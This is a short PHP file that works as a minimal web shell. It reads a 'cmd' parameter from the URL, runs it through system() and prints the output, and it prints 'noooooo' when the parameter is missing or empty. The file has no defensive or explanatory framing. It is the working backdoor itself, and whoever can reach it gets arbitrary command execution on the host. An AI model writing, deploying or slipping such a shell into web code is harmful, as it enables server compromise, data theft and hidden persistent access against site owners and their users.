<?php
# ixa
# rip indentation 
if (isset($_GET['cmd']))
{
if ($_GET['cmd'] == NULL)
{
echo "noooooo";
}
else
{
echo system($_GET['cmd']);
}
}
else
{
echo "noooooo";
}
?>
